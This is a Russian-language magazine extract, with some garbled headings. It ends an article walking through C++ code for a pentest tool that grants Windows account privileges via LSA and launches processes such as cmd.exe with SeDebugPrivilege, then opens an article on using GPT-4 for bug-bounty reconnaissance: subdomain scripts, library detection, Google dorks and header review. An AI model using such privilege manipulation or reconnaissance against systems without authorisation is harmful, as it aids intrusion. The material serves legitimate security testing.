    lsastrComputer.MaximumLength = lsastrComputer.Length + sizeof(
WCHAR);
    lsastrComputer.Buffer = (PWSTR)&cCompName;
    NTSTATUS ntStatus = LsaOpenPolicy(&lsastrComputer, &lsaOA,
POLICY_ALL_ACCESS, LsaHandle);


    ULONG lErr = LsaNtStatusToWinError(ntStatus);
    if (lErr != ERROR_SUCCESS) {
        std::wcout << L" [-] LsaOpenPolicy() Error: " << lErr << std:
:endl;
        return 1;
    }
    else {
        std::wcout << L" [+] LsaOpenPolicy() Success" << std::endl;
        return 0;
    }
    return 1;
}

По лучают хендл на политику через функцию LsaOpenPolicy. Единственная
особенность работы с LSA состоит в том, что у нее свои коды оши бок,
которые прос то через GetLastError() не поймать. Нуж но получать зна чение
NTSTATUS, которое воз вращает каж дая функция, работающая с LSA, а затем
передавать это значение в LsaNtStatusToWinError() для преобразования
в понятный человеческому глазу код ошибки.
  По коду ошибки можно понять, что сломалось, — заглядывай в офи циаль-
ную документацию.
   Если система выдала нам корректный хендл и мы не получи ли ERROR_AC-
CESS_DENIED, переходим к навеши ванию привилегии пользовате лю, к фун-
кции AddUserPrivilege().


DWORD AddUserPrivilege(LSA_HANDLE hPolicy, LPWSTR wUsername, LPWSTR
wPrivName, BOOL bEnable) {
    PSID UserSid;
    DWORD sid_size = 0;
    LPTSTR wSidStr = NULL;
    DWORD domain_size = 0;
    SID_NAME_USE sid_use;
    if (!LookupAccountName(NULL, wUsername, NULL, &sid_size, NULL, &
domain_size, &sid_use)) {
        UserSid = (PSID)VirtualAlloc(NULL, sid_size, MEM_RESERVE |
MEM_COMMIT, PAGE_READWRITE);
        LPTSTR domain = NULL;
        domain = (LPTSTR)VirtualAlloc(NULL, domain_size * sizeof(
WCHAR), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        LookupAccountName(NULL, wUsername, UserSid, &sid_size, domain
, &domain_size, &sid_use);
        VirtualFree(domain, 0, MEM_RELEASE);
        ConvertSidToStringSid(UserSid, &wSidStr);
        std::wcout << L" [+] User SID: " << wSidStr << std::endl;


        LSA_UNICODE_STRING lsastrPrivs[1] = { 0 };


        lsastrPrivs[0].Buffer = (PWSTR)wPrivName;
        lsastrPrivs[0].Length = lstrlen(lsastrPrivs[0].Buffer) *
sizeof(WCHAR);
        lsastrPrivs[0].MaximumLength = lsastrPrivs[0].Length + sizeof
(WCHAR);


        if (bEnable) {
            NTSTATUS ntStatus = LsaAddAccountRights(hPolicy, UserSid,
lsastrPrivs, 1);


            ULONG lErr = LsaNtStatusToWinError(ntStatus);
            if (lErr == ERROR_SUCCESS) {
                std::wcout << L" [+] Adding " << wPrivName << L"
Success" << std::endl;


                std::wcout << L" [+] Enumerating Current Privs" <<
std::endl;
                PrintTrusteePrivs(hPolicy, UserSid);
                VirtualFree(UserSid, 0, MEM_RELEASE);
                return 0;
            }
            else {
                wprintf(L" [-] Error LsaAddAccountRights() %d", lErr)
;
                return 1;
            }
        } else {
            ULONG lErr = LsaRemoveAccountRights(hPolicy, UserSid,
FALSE, lsastrPrivs, 1);
            if (lErr == ERROR_SUCCESS) {
                std::wcout << L" [-] Removing " << wPrivName << L"
Success" << std::endl;
                std::wcout << L" [+] Enumerating Current Privs" <<
std::endl;
                PrintTrusteePrivs(hPolicy, UserSid);
                VirtualFree(UserSid, 0, MEM_RELEASE);
                return 0;
            }
            else {
                wprintf(L" [-] Error LsaRemoveAccountRights() %d",
lErr);
                return 1;
            }
        }
    }
    else {
        std::wcout << L" [-] LookupAccountName() Error: " <<
GetLastError() << std::endl;
        return 1;
    }
    return 1;
}

Добав ление привилегий пользователю происходит в нес колько этапов.
 1. Обнаруже ние по имени пользователя его SID.
 2. Ге нерация LSA_UNICODE_STRING с именем привилегии, которую нужно
   добавить.
 3. Вы зов LsaAddAccountRights() .
 4. Провер ка успешнос ти добавления при вилегии.

Об наружить SID поль зователя по его име ни можно с помощью упомянутой
функции LookupAccountName(). Ее осо бен ность заключается в том, что если
в качестве буфера, куда должен упасть SID, передавать NULL, то функция
прос то вернет тре буемый размер буфера под размещение в нем SID.
Получаем размер, затем выделяем память под буфер и получаем SID.


if (!LookupAccountName(NULL, wUsername, NULL, &sid_size, NULL, &
domain_size, &sid_use)) {
    UserSid = (PSID)VirtualAlloc(NULL, sid_size, MEM_RESERVE |
MEM_COMMIT, PAGE_READWRITE);
    LPTSTR domain = NULL;
    domain = (LPTSTR)VirtualAlloc(NULL, domain_size * sizeof(WCHAR),
MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    LookupAccountName(NULL, wUsername, UserSid, &sid_size, domain, &
domain_size, &sid_use);
    VirtualFree(domain, 0, MEM_RELEASE);
    ConvertSidToStringSid(UserSid, &wSidStr);
    std::wcout << L" [+] User SID: " << wSidStr << std::endl;

Для пре образования струк туры SID в строку, содер жащую SID, можно вызвать
ConvertSidToStringSid().
  Имя привиле гии дол жно быть записано в структуру LSA_UNICODE_STRING,
выглядит вот так.


typedef struct _LSA_UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} LSA_UNICODE_STRING, *PLSA_UNICODE_STRING;

Можно, нап ример, заполнять структуру ручками, как сде лал я в проекте, либо
использовать отдель ную фун кцию, как в мо ем инс трументе для инжекта
тикетов Kerberos.


LSA_UNICODE_STRING lsastrPrivs[1] = { 0 };
lsastrPrivs[0].Buffer = (PWSTR)wPrivName;
lsastrPrivs[0].Length = lstrlen(lsastrPrivs[0].Buffer) * sizeof(WCHAR
);
lsastrPrivs[0].MaximumLength = lsastrPrivs[0].Length + sizeof(WCHAR);

Наконец, вызываем функцию LsaAddAccountRights().


if (bEnable) {
    NTSTATUS ntStatus = LsaAddAccountRights(hPolicy, UserSid,
lsastrPrivs, 1);
    ULONG lErr = LsaNtStatusToWinError(ntStatus);
    if (lErr == ERROR_SUCCESS) {
        std::wcout << L" [+] Adding " << wPrivName << L" Success" <<
std::endl;
        std::wcout << L" [+] Enumerating Current Privs" << std::endl;
        PrintTrusteePrivs(hPolicy, UserSid);
        VirtualFree(UserSid, 0, MEM_RELEASE);
        return 0;
    }
    else {
        wprintf(L" [-] Error LsaAddAccountRights() %d", lErr);
        return 1;
    }

Условие if (bEnable) позволит использовать функцию AddUserPrivilege(
) не толь ко для добав ления, но и для уда ления при виле гий из аккаунта (эту
операцию мы рассмот рим чуть позже). Сама фун кция по добавлению при-
вилегии особо ничего не требует — хендл LSA, SID пользователя, имя при-
вилегии, которые мы ей и передаем. Если привилегия успешно добав лена,
дергаем PrintTrusteePrivs() — очередную функцию, которая выведет все
при виле гии, назначенные конкретному аккаунту.


DWORD PrintTrusteePrivs(LSA_HANDLE hPolicy, PSID psid) {
    BOOL fSuccess = FALSE;
    WCHAR szTempPrivBuf[256];
    WCHAR szPrivDispBuf[1024];
    PLSA_UNICODE_STRING plsastrPrivs = NULL;


    __try {
        ULONG lCount = 0;
        NTSTATUS ntStatus = LsaEnumerateAccountRights(hPolicy, psid,
&plsastrPrivs, &lCount);
        ULONG lErr = LsaNtStatusToWinError(ntStatus);
        if (lErr != ERROR_SUCCESS) {
            plsastrPrivs = NULL;
            __leave;
        }
        ULONG lDispLen = 0;
        ULONG lDispLang = 0;
        for (ULONG lIndex = 0; lIndex < lCount; lIndex++) {
            lstrcpyn(szTempPrivBuf, plsastrPrivs[lIndex].Buffer,
plsastrPrivs[lIndex].Length);
            szTempPrivBuf[plsastrPrivs[lIndex].Length] = 0;


            wprintf(L"\tProgrammatic name: %s\n", szTempPrivBuf);


            lDispLen = 1024;
            if (LookupPrivilegeDisplayNameW(NULL, szTempPrivBuf,
szPrivDispBuf, &lDispLen, &lDispLang))
                wprintf(L"\tDisplay Name: %ws\n\n", szPrivDispBuf);
        }
        fSuccess = TRUE;
    }
    __finally {
        if (plsastrPrivs) LsaFreeMemory(plsastrPrivs);
    }
    return (fSuccess);
}

Здесь с помощью функции LsaEnumerateAccountRights() мы получаем
количество при виле гий пользователя, а в буфер PLSA_UNICODE_STRING упа-
дут их име на. После чего в цикле прос то пар сим их, дополнительно получая
дружествен ные имена с помощью LookupPrivilegeDisplayNameW().
  В принципе, вот так работает добавление привилегий аккаунту.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ




            УПРАВЛЯЕМ ПРИВИЛЕГИЯМИ В WINDOWS





ÇÀÏÓÑÊÀÅÌ ÏÐÎÖÅÑÑ Ñ ÏÐÈÂÈËÅÃÈÅÉ

Осо бенностью второго режима работы можно счи тать то, что нам придется
про верять не только имя привиле гии, но и путь, чтобы на каком-нибудь пен-
тесте в самый раз гар работ не вывалилось веселое исключение. Проверку
этих данных я реализовал в функции ValidatePathInfo().


DWORD ValidatePathInfo(wchar_t* Path, wchar_t* cPrivName) {
    BOOL bPathEx = PathFileExistsW(Path);
    if (bPathEx) {
        std::wcout << L"[+] " << Path << L" Found" << std::endl;
        if (!ValidatePriv(cPrivName)) {
            std::wcout << L"[-] ValidatePathInfo() success" << std::
endl;
            return 1;
        }
        else {
            std::wcout << L"[+] ValidatePathInfo() success" << std::
endl;
            return 0;
        }
        return 0;
    }
    else {
        std::wcout << L"[-] " << Path << L" not found" << std::endl;
        return 1;
    }
    return 1;
}

Проверить путь (то есть убедиться, что файл, к которо му поль зователь ука зал
путь, существует) удобнее всего с помощью PathFileExists. Функция
работа ет проще некуда: вернет TRUE, если путь существует, FALSE — если
нет.
   Убе див шись в корректности предоставленных дан ных, программа перехо-
дит к InitMode2():


DWORD InitMode2(wchar_t* cPath, wchar_t* cPrivName) {
    std::wcout << L"[+] Initializing mode 2 \n [+] Path to exe: " <<
cPath << "\n [+] Privilege: " << cPrivName << std::endl;


    ImpersonateSelf(SecurityImpersonation);
    HANDLE hToken = NULL;
    OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &
hToken);
    DWORD dw = ::GetLastError();
    if (dw != 0) {
        std::wcout << L"[!] Error OpenThreadToken(): " << dw << std::
endl;
        return 1;
    }


    if (EnableTokenPrivilege(hToken, cPrivName, TRUE) == 0) {
        std::wcout << L" [+] EnableTokenPrivilege() success" << std::
endl;
        STARTUPINFO startupInfo;
        ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
        PROCESS_INFORMATION processInformation;
        ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
        startupInfo.cb = sizeof(STARTUPINFO);
        CreateProcessWithTokenW(hToken, LOGON_WITH_PROFILE, NULL,
cPath, 0, NULL, NULL, &startupInfo, &processInformation);
        DWORD dw = ::GetLastError();
        if (dw != 0) {
            std::wcout << L"[!] Error CreateProcessWithTokenW(): " <<
dw << std::endl;
            return 1;
        }
        else {
            std::wcout << L"[+] CreateProcessWithTokenW() success" <<
std::endl;
            return 0;
        }


    }
    else {
        std::wcout << L" [-] EnableTokenPrivilege() failed" << std::
endl;
        return 1;
    }


    return 0;
}

Процесс мож но разделить на несколько этапов:
 1. Привязка текущего токена процесса к токену текуще го потока.
 2. Получе ние хен дла на этот токен.
 3. До бав ление при виле гии в токен.
 4. Старт процесса с измененным токеном.

Итак, пер вые два шага дос таточно простые. Нацепить токен про цесса
на токен текуще го потока можно с помощью ImpersonateSelf(), затем
получаем хендл на него через OpenThreadToken(). И вновь используется
отдельная функция для добавления привилегии. Мне нравится подоб ная
модульность, потому что мож но взять из одного проекта функцию и просто
скопиро вать ее в другой.


DWORD EnableTokenPrivilege(HANDLE hToken, LPTSTR szPriv, BOOL
bEnabled) {
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!LookupPrivilegeValue(NULL, szPriv, &luid)) {
        std::wcout << L"[-] LookupPrivilegeValue() Error: " <<
GetLastError() << std::endl;
        return 1;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = bEnabled ? SE_PRIVILEGE_ENABLED : 0
;
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(
TOKEN_PRIVILEGES), NULL, NULL)) {
        std::wcout << L"[-] AdjustTokenPrivileges() Error: " <<
GetLastError() << std::endl;
        return 1;
    }
    return 0;
}

Сна чала заводим специальную струк туру, в которую занесем LUID при виле-
гии. LUID — это некая интерпретация привилегии в системе, по которой вин-
да понимает, что за при вилегия перед ней. Получить LUID можно с помощью
LookupPrivilegeValue(). Для добавления привилегии в токен передаем
созданную структуру в функцию AdjustTokenPrivileges. Причем в нее мож-
но передать сразу нес колько при виле гий. Например, чтобы сразу добавить
SeDebugPrivilege и SeImpersonatePrivilege, но в нашем слу чае этого
не тре буется.
  После чего поток управления возвра щает ся в функцию InitMode2(),
в которой мы вызываем функцию CreateProcessWithToken(), поз воляющую
создать процесс с токеном, куда мы добави ли привилегии.


.\Privilegerx64.exe 2 C:\Windows\System32\cmd.exe SeDebugPrivilege





           Успешный запуск процесса с нуж ными привилегиями


ÓÄÀËßÅÌ ÏÐÈÂÈËÅÃÈÞ ÈÇ ÀÊÊÀÓÍÒÀ

Иногда может пот ребоваться и обратный сценарий — нужно уда лить при-
вилегию из аккаунта. Начало стан дартное, такое же, как и в первом режиме
работы. То есть мы просто проверяем имя пользователя и привилегию
на валидность. Далее получаем хендл на политику LSA текущего компа и дер-
гаем AddUserPrivilege(). Помнишь эту фун кцию?


DWORD AddUserPrivilege(LSA_HANDLE hPolicy, LPWSTR wUsername, LPWSTR
wPrivName, BOOL bEnable)

Пос ледним параметром мы можем передать FALSE, что приведет к срабаты-
ванию сле дующе го условия.


else {
    ULONG lErr = LsaRemoveAccountRights(hPolicy, UserSid, FALSE,
lsastrPrivs, 1);
    if (lErr == ERROR_SUCCESS) {
        std::wcout << L" [-] Removing " << wPrivName << L" Success" <
< std::endl;
        std::wcout << L" [+] Enumerating Current Privs" << std::endl;
        PrintTrusteePrivs(hPolicy, UserSid);
        VirtualFree(UserSid, 0, MEM_RELEASE);
        return 0;
    }
    else {
        wprintf(L" [-] Error LsaRemoveAccountRights() %d", lErr);
        return 1;
        }
    }

Как следствие, при вилегия будет снята с указан ного аккаунта с помощью
вызова фун кции LsaRemoveAccountRights. Потом мы дергаем Print-
TrusteePrivs(), что позволяет вывес ти новый список привиле гий поль-
зователя.


.\Privilegerx64.exe 3 Michael SeDebugPrivilege





ÈÙÅÌ ÎÁÚÅÊÒÛ Ñ ÏÐÈÂÈËÅÃÈÅÉ

В этом случае инструменту нужно передать имя привилегии, которую мы
ищем, а также имя компь ютера, на котором мы ее ищем. Нап ример, если нам
нуж но обна ружить все учетные записи, обладающие при вилегией SeDebug-
Privilege, на компьюте ре WINPC, то запуск выполняется сле дующей коман-
дой:


.\Privilegerx64.exe 4 WINPC SeDebugPrivilege





При запуске это го режима я решил не про верять имя компьюте ра, так как,
если указать невалидное имя, сло мается функция LsaOpenPolicy() — вер-
нет код ошибки 1722.





Все уместилось в одну маленькую акку ратную функцию:


DWORD InitMode4(wchar_t* cCompName, wchar_t* cPrivName) {
    LSA_OBJECT_ATTRIBUTES lsaOA = { 0 };
    LSA_UNICODE_STRING lsastrComputer = { 0 };
    LSA_HANDLE hPolicy = NULL;
    lsaOA.Length = sizeof(lsaOA);
    lsastrComputer.Length = (USHORT)(lstrlen(cCompName) * sizeof(
WCHAR));
    lsastrComputer.MaximumLength = lsastrComputer.Length + sizeof(
WCHAR);
    lsastrComputer.Buffer = (PWSTR)cCompName;
    NTSTATUS ntStatus = LsaOpenPolicy(&lsastrComputer, &lsaOA,
POLICY_VIEW_LOCAL_INFORMATION | POLICY_LOOKUP_NAMES, &hPolicy);
    ULONG lErr = LsaNtStatusToWinError(ntStatus);
    if (lErr != ERROR_SUCCESS) {
        if (lErr == 1722) {
            std::wcout << L"[-] LsaOpenPolicy() failed: " << lErr <<
" | Is computer alive?" << std::endl;
            return 1;
        }
        std::wcout << L"[-] LsaOpenPolicy() failed: " << lErr << std:
:endl;
        return 1;
    }


    LSA_UNICODE_STRING privilege = { 0 };
    LSA_ENUMERATION_INFORMATION* array = { 0 };
    ULONG count;
    WCHAR accountName[256];
    WCHAR domainName[256];
    SID_NAME_USE snu;
    DWORD domainLength = sizeof(domainName) / sizeof(WCHAR);
    DWORD accountLength = sizeof(accountName) / sizeof(WCHAR);
    BOOL fSuccess = FALSE;
    LPTSTR StringSid = NULL;
    privilege.Length = (USHORT)(lstrlen(cPrivName) * sizeof(WCHAR));
    privilege.MaximumLength = privilege.Length + sizeof(WCHAR);
    privilege.Buffer = cPrivName;
    __try {
        NTSTATUS ntstatus = LsaEnumerateAccountsWithUserRight(hPolicy
, &privilege, (void**)&array, &count);
        ULONG lErr = LsaNtStatusToWinError(ntstatus);
        if (lErr != ERROR_SUCCESS) {
            array = NULL;
            if (lErr == 259) {
                std::wcout << L" [-] No objects" << std::endl;
            }
            else {
                std::wcout << L" [-]
LsaEnumerateAccountsWithUserRight() failed: " << lErr << std::endl;
            }
            __leave;
        }
        std::wcout << L"[+] Objects with privileges: " << std::endl;
        for (ULONG i = 0; i < count; i++) {
            ConvertSidToStringSid(array[i].Sid, &StringSid);
            LookupAccountSid(NULL, array[i].Sid, accountName, &
accountLength, domainName, &domainLength, &snu);
            switch (snu) {
            case SidTypeUser:
                printf(" [!] User: ");
                wprintf(L"%s\\%s %s \n", domainName, accountName,
StringSid);
                break;
            case SidTypeGroup:
            case SidTypeWellKnownGroup:
                printf(" [!] Group: ");
                wprintf(L"%s\\%s %s\n", domainName, accountName,
StringSid);
                break;
            case SidTypeAlias:
                printf(" [!] Alias SID (may be local group): \t");
                wprintf(L"%s\\%s %s\n", domainName, accountName,
StringSid);
                break;
            default:
                printf(" [!] Idk what is it: ");
                wprintf(L"%s\\%s %s\n", domainName, accountName,
StringSid);
                break;
            }
        }
        fSuccess = TRUE;
    }
    __finally {
        LsaFreeMemory(array);
    }


    return 0;
}

Сна чала мы пытаемся получить хендл политики LSA на компь ютере, имя
которого было передано. Здесь все стандартно — LsaOpenPolicy(). Пос ле
чего соз даем спе циальные структуры для переда чи их в функцию LsaEnumer-
ateAccountsWithUserRight(). Результатом выпол нения функции  станет
массив объектов, обладающих нужной привиле гией. Причем  опять же
для передачи при виле гии мы используем LSA_UNICODE_STRING. Получив мас-
сив объектов, начинаем его парсить. Он будет содержать структуру LSA_ENU-
MERATION_INFORMATION, внутри которой лежит лишь SID:


typedef struct _LSA_ENUMERATION_INFORMATION {
  PSID Sid;
} LSA_ENUMERATION_INFORMATION, *PLSA_ENUMERATION_INFORMATION;

По этому конвертируем в стандар тное имя пользователя через уже извес тную
нам функцию ConvertSidToStringSid(), а затем передаем в функцию
LookupAccountSid() для получения имени пользователя по его SID. Пос-
ледним параметром указывается перечисляемый тип SID_NAME_USE, с его
помощью мы сможем определить тип объекта. Чаще всего это будет Sid-
TypeUser (обыч ный поль зователь), но мало ли что... В связи с этим я добавил
также неболь шие пометки, мол, тут — пользователь, а тут — группа.


ÑÌÎÒÐÈÌ ÏÐÈÂÈËÅÃÈÈ ÎÁÚÅÊÒÀ

Рассмот рим пос ледний, пятый режим работы. Он позволя ет находить при-
вилегии, которы ми обладает определенная учетная запись на компьюте ре.
Начало тут не самое обычное:


case '5':
        std::wcout << L"[!] I'm not able to validate username and PC
name. Make sure you enter the correct data." << std::endl;
        Sleep(500);
        std::wcout << L"[!] Starting" << std::endl;
        if (InitMode5(argv[2], argv[3]) != 0) {
            std::wcout << L"[-] InitMode 5 Error" << std::endl;
        }
    break;

Не исполь зуя никакие вспо могательные RPC-фун кции, мы не сможем про-
вали диро вать имя пользователя и компьюте ра. Поэтому выделя ем самим
себе 500 мс, чтобы убедиться глаз ками, что все в порядке. Ну и опять же —
мень ше тра фика, лишнего шума. Сама основная функция также достаточно
прос та:


DWORD InitMode5(wchar_t* cCompName, wchar_t* cUsername) {
    LSA_HANDLE hPolicy;
    LSA_OBJECT_ATTRIBUTES lsaOA = { 0 };
    LSA_UNICODE_STRING lsastrComputer = { 0 };
    lsaOA.Length = sizeof(lsaOA);
    lsastrComputer.Length = (USHORT)(lstrlen(cCompName) * sizeof(
WCHAR));
    lsastrComputer.MaximumLength = lsastrComputer.Length + sizeof(
WCHAR);
    lsastrComputer.Buffer = (PWSTR)cCompName;
    NTSTATUS ntStatus = LsaOpenPolicy(&lsastrComputer, &lsaOA,
POLICY_VIEW_LOCAL_INFORMATION | POLICY_LOOKUP_NAMES, &hPolicy);
    ULONG lErr = LsaNtStatusToWinError(ntStatus);
    if (lErr != ERROR_SUCCESS) {
        if (lErr == 1722) {
            std::wcout << L"[-] LsaOpenPolicy() failed: " << lErr <<
" | Is computer alive?" << std::endl;
            return 1;
        }
        std::wcout << L"[-] LsaOpenPolicy() failed: " << lErr << std:
:endl;
        return 1;
    }


    PSID UserSid;
    DWORD sid_size = 0;
    LPTSTR wSidStr = NULL;
    DWORD domain_size = 0;
    SID_NAME_USE sid_use;
    if (!LookupAccountName(NULL, cUsername, NULL, &sid_size, NULL, &
domain_size, &sid_use)) {
        UserSid = (PSID)VirtualAlloc(NULL, sid_size, MEM_RESERVE |
MEM_COMMIT, PAGE_READWRITE);
        LPTSTR domain = NULL;
        domain = (LPTSTR)VirtualAlloc(NULL, domain_size * sizeof(
WCHAR), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        LookupAccountName(NULL, cUsername, UserSid, &sid_size, domain
, &domain_size, &sid_use);
        VirtualFree(domain, 0, MEM_RELEASE);
        ConvertSidToStringSid(UserSid, &wSidStr);
        std::wcout << L" [+] User SID: " << wSidStr << std::endl;
        PrintTrusteePrivs(hPolicy, UserSid);
        VirtualFree(UserSid, 0, MEM_RELEASE);
        return 0;
    } else {
        std::wcout << L" [-] LookupAccountName() Error: " <<
GetLastError() << std::endl;
        return 1;
    }


    return 1;
}

Все крутится вокруг уже соз данной функции PrintTrusteePrivs(). Нам
остается лишь получить хендл политики LSA на компь ютере, а затем дернуть
LookupAccountName() для получения SID, который мы отда дим в функцию
для вывода существующих привилегий у аккаунта. Кру то, да?


ÂÛÂÎÄÛ

При виле гии в Windows действи тельно очень боль шая и интерес ная тема.
При чем  можно  без  проблем  расширять   Privileger,  совер шенс твовать
и исправ лять мой божественный, суперчистый и великолепный код.
  В любом случае, если у тебя вдруг остались вопросы либо при исполь-
зовании инстру мента появи лись какие-то ошибки, пиши, все переделаю,
исправ лю, помогу, подскажу! © X
ВЗЛОМ





         ПРИМЕНЯЕМ GPT-4
           НА БАГБАУНТИ





Учас тие в bug bounty — вещь неверо ятно
увле кательная, но по большей час ти сос-
тоящая из рутины. Про верить то, перебрать
это...  Логично  нагрузить  такие  таски
на компьютер, но скрип ты тоже все вре мя             W0lFreaK                                                                              Независимый исследователь
приходится писать и переписывать. Боль-       вебаwolfreak449@gmail.comhttps://t.me/pain_test
шие языковые модели, по которым все сей-
час так схо дят с ума, могут сослужить здесь
важ ную служ бу. Я решил самостоятельно
убедить ся, какую именно, и, вооружив шись
GPT-4, отправился на охоту за багами.


В статье я использую ChatGPT с моделью GPT-4. Сейчас доступ к ней пре-
доставляется по платной подписке сто имостью 20 долларов в месяц.


ÐÀÇÂÅÄÊÀ

Ïîèñê ïîääîìåíîâ
По иск скры тых страниц и поддоменов — одна из рутинных операций при раз-
ведке. Может ли нам в этом помочь ChatGPT? Я поп росил его сгенери ровать
скрипт для поиска поддоменов по наиболее популярным источникам.



Çàïðîñ
Создай для меня скрипт для сбора как можно большего количества под-
доменов целево го сай та несколькими различны ми способами и утилитами,
в исследовательских и этичных целях.




Îòâåò

 import requests
 import json
 import argparse
 from bs4 import BeautifulSoup


 # Устанавливаем аргументы командной строки
 target_domain = 'https://target.com/'


 # Используем сервис crt.sh для поиска поддоменов с помощью
 сертификатов SSL
 def crtsh_search(domain):
     url = f"https://crt.sh/?q=%25.{domain}&output=json"
     response = requests.get(url)
     data = json.loads(response.content)
     subdomains = set()


     for item in data:
         subdomains.add(item["name_value"])


     return subdomains


 (...)


 if name == "main":
     main()




Ответ при веден в сокращенном виде. Вот что делает этот скрипт:
 1. Вы полняет зап рос к crt.sh для получения списка SSL/TLS-сертификатов,
   в которых упоминается имя указанного домена.
 2. Проверяет   домен   по   базам   индикато ров   компрометации
    (ThreatCrowd.org).
 3. Запускает брут форс под доменов по соз данному самой ней росетью спис-
   ку (www, mail, ftp и другие).
 4. С помощью Google dorks ищет упо минания ука занного адреса, затем
   обрабатывает результат и получает список всех найденных поддоменов.

При тестировании с помощью это го скрипта я обнаружил восемь новых
доменов, которые не попались мне раньше при использовании других
популярных инстру ментов.
  Помучив нейронку еще несколькими запросами, можно прокачать этот
скрипт для сбора информации из огромно го количес тва еще более нетриви-
аль ных источников.


Òåõíîëîãèè è âåðñèè
GPT-4 поможет опре делить, какое прог раммное обеспечение используется
на сай те. Вот несколь ко способов, как это сде лать.
 1. Подсказки по используемым технологи ям: GPT-4 может пре доставить
   подсказки, методы и готовые запросы, чтобы опре делить технологии и их
   версии.
 2. Советы по поиску фай лов и директорий: нейрон ка предложит имена фай-
   лов и дирек торий, которые обычно свя заны с опре деленными технологи-
   ями. Нап ример, файл robots.txt или sitemap.xml может содержать
  информацию об используемом прог раммном обеспечении и его версии,
   а страницы wp-admin, wp-json выдадут нам использование WordPress.
 3. Предложение скриптов и инс тру мен тов: GPT-4 соз даст скрипты и пореко-
  мендует инструменты, которые спо соб ны опре делить технологии и их вер-
   сии на веб-сервере.

Можно попросить ChatGPT не просто определить используемый софт, а соз-
дать подходящие скрипты. Нап ример, ниже приведен скрипт, который ChatG-
PT создал для детектирования определен ного набора JS-биб лиотек, исполь-
зуемых на сай те. Давай попробуем!



Çàïðîñ
Создай JS-скрипт для определения используемых на сайте JS-биб лиотек.




Îòâåò

 (function() {
   const libraries = [
     { name: "jQuery", object: "jQuery" },
     { name: "React", object: "React" },
     { name: "AngularJS", object: "angular" },
     { name: "Vue", object: "Vue" },
     // Добавь другие библиотеки здесь, если необходимо
   ];


 (...)


     } else {
       results.forEach((lib) => {
         console.log(`${lib.name}: ${lib.version}`);
       });
     }
   }


   const detectedLibraries = detectLibraries();
   displayResults(detectedLibraries);
 })();




Как показала практика, такой подход помога ет выявить больше исполь зуемых
в данный момент биб лиотек, чем знают публичные сервисы вроде BuiltWith.
Также он позволя ет получить сведения о технологиях любой страницы сайта,
а не только доступных без авто ризации. Фун кци ональность и перечень детек-
тируемых сге нерированным скрип том библиотек не дотяги вает до всем
известного Wappalyzer, однако по нашему зап росу нейронка может модифи-
цировать скрипт и интегрировать в него воз можность определения пуб-
личных уязвимостей в выявленных библиотеках с помощью Vulners или Mitre.
  Мож но исполь зовать нейросеть и прос то для создания дорков, чтобы
эффектив нее искать информацию о целевых системах.



Çàïðîñ
Напиши зап рос с использованием Google dorks для определе ния веб-сайтов,
использующих CMS Bitrix.




Îòâåò

 inurl:/bitrix/ intitle:bitrix filetype:php intitle:"Bitrix" "bitrix_
 sessid"




Ес ли ввести такой зап рос в Google, то это позволит получить страницы:
 •  inurl: Bitrix — в URL которых содержится /bitrix/ (характерный признак
   сай тов, работа ющих на «Битрикс»);
 •  intitle: Bitrix — в заголовках которых встречается слово Bitrix;
 • bitrix_sessid — на которых используется дан ный параметр, свидетельству-
  ющий об исполь зовании «Битрикс»;
 • letype: php — служит для исключения веб-сай тов, написанных на нетипич-
   ных для «Битрикс» языках прог рамми рования, но под ходящих под про чие
   параметры зап роса.


ÏÎÈÑÊ ÌÈÑÊÎÍÔÈÃÎÂ

Еще один вариант использования ChatGPT — анализ корректнос ти воз вра-
щаемых сер вером заголов ков безопасности. Ты можешь предос тавить
заголов ки отве та сервера, и ChatGPT про ана лизирует их, выявив отсутству-
ющие или некорректные заголовки, которые могут означать наличие уяз-
вимос тей (нап ример, мисконфи гурации CORS и CSP).



Çàïðîñ
Веб-сервер в ответ на мой запрос вер нул следующие заголовки. Подска жи,
безопасна ли данная конфигурация? Какие заголовки отсутствуют или нас-
троены небезопасно?


 HTTP/2 200 OK
 Server: nginx
 Date: Sat, 08 Apr 2023 18:49:17 GMT





Îòâåò
Кон фигурация заголов ков, предос тавленная сервером, включает в себя ряд
мер по обеспечению безопасности, но некото рые важ ные заголовки отсутс-
твуют. Вот краткий анализ предоставленных заголовков:
   X-Xss-Protection: 1; mode=block — заголо вок X-XSS-Protection предотвра-
щает отраженные меж сайтовые скрип ты (XSS). Зна чение «1; mode=block»
указывает браузе ру блокировать ответ, если обнаружена XSS.
   X-Frame-Options: SAMEORIGIN — заголо вок X-Frame-Options предот вра-
щает клик дже кинг путем огра ничения встраивания контента сай та на другие
сайты. Значение SAMEORIGIN указывает, что сайт может быть встроен только
на стра ницы с того же источника.
   Content-Security-Policy (CSP) — заголо вок CSP поз воляет указать источни-
ки кон тента для раз личных типов ресур сов, что огра ничивает воз можнос ти
для XSS и других атак. Например, Content-Security-Policy: default-src 'self'; img-
src *; media-src media1.com media2.com; script-src userscripts.example.com.
   Strict-Transport-Security (HSTS) — заголовок HSTS указывает браузе ру
использовать только HTTPS-соединения для общения с сайтом на опре-
деленный пери од. Это помога ет предот вра тить атаки man in the middle и улуч-
шает  безопасность  сай та.  Например,   Strict-Transport-Security:  max-
age=31536000; includeSubDomains.
   X-Content-Type-Options — заголовок X-Content-Type-Options предотвра-
щает атаки на осно ве MIME-типа путем запрета бра узеру интер претировать
документы с неп равильным типом.
  Мож но отме тить, что отсутствие дополнительных заголов ков безопас-
ности, таких как Content-Security-Policy, X-Content-Type-Options, X-XSS-Protec-
tion, X-Frame-Options, может означать отсутствие допол нительной защиты
от некоторых типов атак, таких как ата ки XSS, кликдже кинг, MIME-Sniﬃng
и другие.
   Также наличие дополнительных заголов ков безопас ности, таких как Strict-
Transport-Security, может  ука зывать на  то,  что при ложе ние  использует
защищенное соединение и перенап равляет все HTTP-зап росы на HTTPS.
